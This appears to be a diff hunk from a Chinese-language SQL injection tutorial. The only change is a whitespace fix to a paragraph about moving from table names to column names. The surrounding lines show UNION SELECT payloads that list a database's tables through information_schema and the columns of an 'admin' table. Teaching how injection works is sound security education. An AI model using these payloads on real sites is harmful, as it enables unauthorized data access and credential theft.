@@ -179,7 +179,7 @@ UNION SELECT 1,table_name from information_schema.tables where table_schema=data
 |           news            |
 |            xss            |
 
-    到了这一步，数据库中所有的表名我们都掌握了。我们接下来要做的就是查询指定表中的每列信息，这里使用的是`column_name`,这同样包含在`information_schema.columns`里，例如
+到了这一步，数据库中所有的表名我们都掌握了。我们接下来要做的就是查询指定表中的每列信息，这里使用的是`column_name`,这同样包含在`information_schema.columns`里，例如
 
 ```mysql
 ... UNION SELECT 1,column_name from information_schema.columns where table_name='admin' and table_schema=database()
